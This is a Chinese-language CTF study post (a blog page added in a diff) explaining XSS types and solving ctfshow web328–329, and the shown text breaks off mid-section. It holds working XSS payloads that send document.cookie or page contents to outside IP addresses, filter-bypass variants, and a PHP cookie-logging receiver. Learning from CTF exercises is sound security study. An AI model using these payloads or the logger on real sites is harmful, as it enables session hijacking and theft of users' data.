@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"li1x.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="XSS又叫CSS(Cross Site Script)跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。	常见的输出函数有： ec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS学习">
+<meta property="og:url" content="https://li1x.github.io/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Li1x&#39;s Blog">
+<meta property="og:description" content="XSS又叫CSS(Cross Site Script)跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。	常见的输出函数有： ec">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://li1x.github.io/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/328-00.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/328-01.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/328-02.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/328-03.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/330.01.png">
+<meta property="article:published_time" content="2024-03-25T17:53:47.944Z">
+<meta property="article:modified_time" content="2024-04-12T09:18:09.237Z">
+<meta property="article:author" content="Li1x">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="漏洞学习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://li1x.github.io/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/328-00.png">
+
+
+<link rel="canonical" href="https://li1x.github.io/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://li1x.github.io/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/","path":"CTF/Web/XSS漏洞/","title":"XSS学习"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>XSS学习 | Li1x's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Li1x's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Lifelong Learning</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section">Home</a></li><li class="menu-item menu-item-tags"><a href="/tags" rel="section">Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories" rel="section">Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives" rel="section">Archives</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="nav-number">2.</span> <span class="nav-text">攻击方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM%E5%9E%8BXSS%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">DOM型XSS：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80%EF%BC%9AinnerHTML"><span class="nav-number">2.1.1.</span> <span class="nav-text">场景一：innerHTML</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%8C%EF%BC%9A%E8%B7%B3%E8%BD%AC"><span class="nav-number">2.1.2.</span> <span class="nav-text">场景二：跳转</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%89%EF%BC%9Aeval"><span class="nav-number">2.1.3.</span> <span class="nav-text">场景三：eval</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E5%9B%9B%EF%BC%9Acookie%E3%80%81referer"><span class="nav-number">2.1.4.</span> <span class="nav-text">场景四：cookie、referer</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%94%EF%BC%9Adocument-write%E3%80%81document-URL-indexOf-%E2%80%9Cid-%E2%80%9D"><span class="nav-number">2.1.5.</span> <span class="nav-text">场景五：document.write、document.URL.indexOf(“id&#x3D;”)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Xss-payload"><span class="nav-number">2.1.6.</span> <span class="nav-text">Xss payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%97%A0%E8%BF%87%E6%BB%A4"><span class="nav-number">2.1.7.</span> <span class="nav-text">1.无过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%BF%87%E6%BB%A4script"><span class="nav-number">2.1.8.</span> <span class="nav-text">2.过滤script</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%AD%98%E5%82%A8%E5%9E%8BXss-payload%EF%BC%9A"><span class="nav-number">2.1.9.</span> <span class="nav-text">3.存储型Xss payload：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A5ctfshow-xss-web328%E4%B8%BA%E4%BE%8B%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">以ctfshow xss web328为例：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E4%BA%8E%E7%99%BB%E5%BD%95Cookie%E5%B0%B1%E5%A4%B1%E6%95%88%E7%9A%84%EF%BC%8C%E6%97%A0%E6%B3%95%E4%BC%AA%E9%80%A0cookie%EF%BC%9A"><span class="nav-number">3.1.</span> <span class="nav-text">对于登录Cookie就失效的，无法伪造cookie：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A%E5%A4%96%E5%B8%A6%E4%BF%A1%E6%81%AFpayload%EF%BC%9A%EF%BC%88%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3%EF%BC%89"><span class="nav-number">3.1.1.</span> <span class="nav-text">法一：外带信息payload：（监听端口）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9AjQuery-%E9%80%89%E6%8B%A9%E5%99%A8%E6%9F%A5%E6%89%BE%E7%B1%BB%E5%92%8C%E8%8E%B7%E5%8F%96%E5%86%85%E5%AE%B9%E3%80%82"><span class="nav-number">3.1.2.</span> <span class="nav-text">法二：jQuery 选择器查找类和获取内容。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web329-payload"><span class="nav-number">4.</span> <span class="nav-text">web329 payload:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web330-payload%EF%BC%9A"><span class="nav-number">5.</span> <span class="nav-text">web330 payload：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web-331-payload%EF%BC%9A"><span class="nav-number">6.</span> <span class="nav-text">web 331 payload：</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Li1x"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Li1x</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives">
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://li1x.github.io/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Li1x">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Li1x's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="XSS学习 | Li1x's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          XSS学习
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-03-26 01:53:47" itemprop="dateCreated datePublished" datetime="2024-03-26T01:53:47+08:00">2024-03-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-04-12 17:18:09" itemprop="dateModified" datetime="2024-04-12T17:18:09+08:00">2024-04-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="CTF/Web/XSS漏洞/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>6.7k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>12 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>XSS又叫CSS(Cross Site Script)跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
+<p>xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。	常见的输出函数有： echo printf print print_r sprintf die var-dump var_export.</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。</li>
+<li>诱使受害者打开受到攻击的服务器URL。</li>
+<li>受害者在Web浏览器中打开URL，恶意脚本执行。</li>
+</ul>
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p><strong>反射型XSS：</strong>&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内	容），一般容易出现在搜索页面。一般是后端代码进行处理</p>
+<p><strong>存储型XSS：</strong>&lt;持久化&gt; 代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p>
+<p><strong>DOM型XSS：</strong>基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。一般是浏览器前端代码进行处理。</p>
+<h3 id="DOM型XSS："><a href="#DOM型XSS：" class="headerlink" title="DOM型XSS："></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12542695.html">DOM型XSS：</a></h3><h4 id="场景一：innerHTML"><a href="#场景一：innerHTML" class="headerlink" title="场景一：innerHTML"></a>场景一：innerHTML</h4><h4 id="场景二：跳转"><a href="#场景二：跳转" class="headerlink" title="场景二：跳转"></a>场景二：跳转</h4><h4 id="场景三：eval"><a href="#场景三：eval" class="headerlink" title="场景三：eval"></a>场景三：eval</h4><h4 id="场景四：cookie、referer"><a href="#场景四：cookie、referer" class="headerlink" title="场景四：cookie、referer"></a>场景四：cookie、referer</h4><h4 id="场景五：document-write、document-URL-indexOf-“id-”"><a href="#场景五：document-write、document-URL-indexOf-“id-”" class="headerlink" title="场景五：document.write、document.URL.indexOf(“id&#x3D;”)"></a>场景五：document.write、document.URL.indexOf(“id&#x3D;”)</h4><p><strong>解释一些常用js代码的意思:</strong></p>
+<p><code>onload</code>：事件处理程序，它会在网页加载完成后执行</p>
+<p><code>document.cookie</code>：截取当前网页所有cooies，cookies是存储在用户浏览器上的小型数据片段，通常用于识别用户或保存的设置</p>
+<p><code>location.href</code>：这会将当前网页的url重定向到 后面的地址</p>
+<p><code>onerror</code>：当事件失败时会触发，<strong>配合img标签使用，不给图片地址（加载失败）&#x3D;&gt;触发onerror</strong></p>
+<p><strong>Linux服务器关闭端口的一些常用指令：</strong></p>
+<p><code>netstat -tuln</code></p>
+<blockquote>
+<p>-&gt; -t 是显示TCP协议的连接</p>
+<p>-&gt; -u 是显示UDP协议的连接</p>
+<p>-&gt; -l 是仅显示监听状态的连接</p>
+<p>-&gt; -n 是以数字形式显示端口号和IP地址</p>
+</blockquote>
+<p><strong>Xss测试过滤：</strong></p>
+<script>alert(1)</script>
+
+<p>&lt;img alert(1)&gt;</p>
+<body>alert(1)(</body>
+
+<h4 id="Xss-payload"><a href="#Xss-payload" class="headerlink" title="Xss payload"></a><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/340080.html">Xss payload</a></h4><h4 id="1-无过滤"><a href="#1-无过滤" class="headerlink" title="1.无过滤"></a>1.无过滤</h4><p><code>&lt;script&gt;location.href=&quot;http://(自己服务器的公网ip)/127.php(存放上述php代码的文件)?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
+<p><code>&lt;script&gt; onload=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 127.php 创建在自己的站点的根目录下（payload中路径一样即可）</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);    <span class="comment"># a模式是追加模式（在文件末尾添加内容）</span></span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$time</span>.<span class="string">&#x27;:    &#x27;</span>. <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-过滤script"><a href="#2-过滤script" class="headerlink" title="2.过滤script"></a>2.过滤script</h4><blockquote>
+<p><code>&lt;body onload=&quot;location.href=&#39;http://(自己服务器的公网ip)/127.php?cookie=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<p><code>&lt;img src=&#39;&#39; onerror=location.href=&#39;http://39.103.98.109/127.php?cookie=&#39;+document.cookie&gt;</code></p>
+<p><code>&lt;svg/**/οnlοad=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&gt;</code></p>
+<p><code>&lt;input/**/οnfοcus=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&gt;</code></p>
+<p><code>&lt;iframe/**/οnlοad=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&gt;&lt;/iframe&gt;</code></p>
+</blockquote>
+<h4 id="3-存储型Xss-payload："><a href="#3-存储型Xss-payload：" class="headerlink" title="3.存储型Xss payload："></a>3.存储型Xss payload：</h4><p><code>&lt;script&gt; onload=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
+<h2 id="以ctfshow-xss-web328为例："><a href="#以ctfshow-xss-web328为例：" class="headerlink" title="以ctfshow xss web328为例："></a>以ctfshow xss web328为例：</h2><p><code>&lt;script&gt;window.open(&#39;http://39.103.98.109:10086/&#39;+document.cookie)&lt;/script&gt;</code></p>
+<p>题目：用户管理页面有信息（需要是admin用户    才可以看到flag）</p>
+<p>思路：伪造SESSION admin用户</p>
+<p><strong>1. 获取admin的SESSION：监听端口，用户注册，收到的信息里面的SESSION应该是admin的</strong></p>
+<p><img src="/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/328-00.png"></p>
+<p><img src="/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/328-01.png"></p>
+<p><strong>2.抓包改SESSION 发包：这里面需要发两次包  每次收到的包都要改SESSION再发送</strong></p>
+<p><img src="/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/328-02.png"></p>
+<p><img src="/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/328-03.png"></p>
+<h3 id="对于登录Cookie就失效的，无法伪造cookie："><a href="#对于登录Cookie就失效的，无法伪造cookie：" class="headerlink" title="对于登录Cookie就失效的，无法伪造cookie："></a>对于登录Cookie就失效的，无法伪造cookie：</h3><h4 id="法一：外带信息payload：（监听端口）"><a href="#法一：外带信息payload：（监听端口）" class="headerlink" title="法一：外带信息payload：（监听端口）"></a>法一：外带信息payload：（监听端口）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、innerHTML:从对象的起始位置到终止位置的全部内容,不包括Html标签。 innerText可替代innerHTML</span><br><span class="line">2、outerHTML:除了包含innerHTML的全部内容外, 还包含对象标签本身。</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;script&gt;window.open(&#39;http://39.103.98.109:10086/&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)&lt;/script&gt;</code></p>
+<p>-&gt; <code>window.open</code> 打开新链接</p>
+<p>-&gt; <code>document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;) </code>是一个通过类名查找元素的方法。它查找具有类名 ‘layui-table-cell’ 和 ‘laytable-cell-1-0-1’ 的元素，通常这是一种针对表格单元格的选择。</p>
+<p>-&gt; <code>[1]</code> 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 0 开始）</p>
+<h4 id="法二：jQuery-选择器查找类和获取内容。"><a href="#法二：jQuery-选择器查找类和获取内容。" class="headerlink" title="法二：jQuery 选择器查找类和获取内容。"></a>法二：jQuery 选择器查找类和获取内容。</h4><p>jQuery选择器：用于选择HTML元素的强大工具，使得开发者能更好的获取页面中的元素.</p>
+<p><code>&lt;script&gt;$(&#39;div.layui-table-cell.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;if ((value.innerHTML.indexOf(&#39;ctfshow&#123;&#39;) &gt; -1)&amp;&amp;(value.innerHTML.indexOf(&#39;script&#39;) === -1)) &#123;window.location.href = &#39;http://39.103.98.109:10086/&#39; +value.innerHTML;&#125;&#125;);&lt;/script&gt;</code></p>
+<blockquote>
+<p><code>$(&#39;div.layui-table-cell.laytable-cell-1-0-1&#39;).each(function(index, value) &#123; ... &#125;);</code></p>
+<p>这是一个 jQuery 选择器，它查找具有类名 <code>&#39;layui-table-cell&#39;</code>、<code>&#39;laytable-cell-1-0-1&#39;</code> 的 <code>&lt;div&gt;</code> 元素集合，并对每个元素执行一个函数</p>
+</blockquote>
+<blockquote>
+<p><code>.each(function(index, value) &#123; ... &#125;)</code></p>
+<p>这是 jQuery 的遍历方法，它会遍历匹配的元素集合，并对每个元素执行包含在函数中的操作。在这里，函数接受两个参数，<code>index</code> 表示当前元素在集合中的索引，<code>value</code> 表示当前元素的引用。</p>
+</blockquote>
+<blockquote>
+<p><code>if (value.innerHTML.indexOf(&#39;ctfshow&#123;&#39;) &gt; -1) &#123; ... &#125;</code><br>这是在遍历中的条件语句，它检查当前元素的内容是否包含字符串 <code>&#39;ctfshow&#123;&#39;</code>。<code>value.innerHTML</code> 表示当前元素的 HTML 内容，<code>.indexOf(&#39;ctfshow&#123;&#39;)</code> 用于查找是否包含 <code>&#39;ctfshow&#123;&#39;</code>，如果包含则返回大于 -1 的索引，否则返回 -1</p>
+</blockquote>
+<blockquote>
+<p><code>window.location.href = &#39;http://120.46.41.173:9023/&#39; + value.innerHTML;</code><br> 如果条件满足，即当前元素的内容包含 <code>&#39;ctfshow&#123;&#39;</code>，则执行这一行代码。它会将浏览器的当前位置重定向到一个新的 URL，这个 URL 是 <code>&#39;http://120.46.41.173:9023/&#39;</code> 加上当前元素的内容。这样就可以在浏览器中打开一个新的页面，新页面的 URL 包含了 <code>&#39;ctfshow&#123;&#39;</code> 以及其他内容。</p>
+</blockquote>
+<p><strong>法三：querySelector方法获取内容</strong></p>
+<p>querySelector：DOM（文档对象模型）选择器，通过CSS选择器从文档中获取一个匹配的元素，返回的是文档中匹配指定的CSS选择器中的第一个元素。    querySelectorAll返回匹配的全部元素</p>
+<p><strong>基本语法：</strong></p>
+<ul>
+<li><code>var element = document.querySelector(selector);</code></li>
+</ul>
+<p>-&gt; selector 是一个字符串，表示要查找的元素的CSS选择器</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过ID选择元素</span></span><br><span class="line">var elementById = document.querySelector(&#x27;#myId&#x27;);</span><br><span class="line"><span class="comment">// 通过类名选择元素</span></span><br><span class="line">var elementsByClass = document.querySelector(&#x27;.myClass&#x27;);</span><br><span class="line"><span class="comment">// 通过标签名选择元素</span></span><br><span class="line">var elementsByTagName = document.querySelector(&#x27;div&#x27;);</span><br><span class="line"><span class="comment">// 使用复杂的选择器，本题就是这种</span></span><br><span class="line">var complexSelector = document.querySelector(&#x27;div.container &gt; p<span class="punctuation">:</span>first-child&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><code>\#top &gt; div.layui-container</code> 可以将所有源码都读了, 最方便</p>
+<h2 id="web329-payload"><a href="#web329-payload" class="headerlink" title="web329 payload:"></a>web329 payload:</h2><p> <code>&lt;script&gt;var img = new Image();img.src = &quot;http://39.103.98.109:10086/&quot;+document.querySelector(&#39;#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#39;).textContent;document.body.append(img);&lt;/script&gt;</code></p>
+<blockquote>
+<p>new Image() 创建新的图像元素对象，并将其分配给了img变量.</p>
+</blockquote>
+<blockquote>
